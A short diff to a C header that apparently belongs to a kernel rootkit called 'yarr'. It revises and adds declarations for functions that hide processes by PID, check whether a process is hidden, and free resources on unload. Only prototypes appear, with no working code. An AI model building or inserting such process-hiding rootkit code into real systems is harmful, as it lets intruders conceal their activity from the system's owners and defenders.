@@ -27,7 +27,13 @@
  * called BEFORE using any other function specified here. Elsewhere behaviour
  * is undefined... and undefined behaviour in the kernel means reboot please.
  */
-int init_hideproc(void);
+void init_hideproc(void);
+
+/***
+ * Liberate resources taken during the living of yarr inside the kernel. This
+ * function should be called just during yarr unload.
+ */
+void exit_hideproc(void);
 
 /***
  * Hides the process of PID <pid>.
@@ -44,6 +50,14 @@ int hideProc(pid_t pid);
  * @return: Zero on success or -1 if there were errors.
  */
 int stopHideProc(pid_t pid);
+
+/***
+ * Tells whether a process is being (should be) hidden or not.
+ *
+ * @pid: The PID of the process to check for.
+ * @return: Zero if the process is not being hidden or non-zero elsewhere.
+ */
+int isProcHidden(pid_t pid);
 
 #endif /* __YARR_NINJA_TASKS */
 
